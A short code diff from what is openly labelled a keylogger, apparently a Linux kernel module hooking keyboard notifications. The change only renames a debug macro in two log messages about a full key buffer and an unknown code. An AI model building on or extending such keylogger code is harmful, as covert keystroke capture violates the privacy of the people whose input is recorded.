@@ -102,7 +102,7 @@ void translate_keysym ( struct keyboard_notifier_param *param, char *buf )
 
     if ( logidx >= LOGSIZE )
     {
-        DEBUG_KEY("KEYLOGGER: Failed to log key, buffer is full\n");
+        DEBUG("KEYLOGGER: Failed to log key, buffer is full\n");
         return;
     }
 
@@ -197,7 +197,7 @@ int notify ( struct notifier_block *nblock, unsigned long code, void *_param )
                 break;
 
             default:
-                DEBUG_KEY("KEYLOGGER: Received unknown code\n");
+                DEBUG("KEYLOGGER: Received unknown code\n");
                 break;
         }
     }
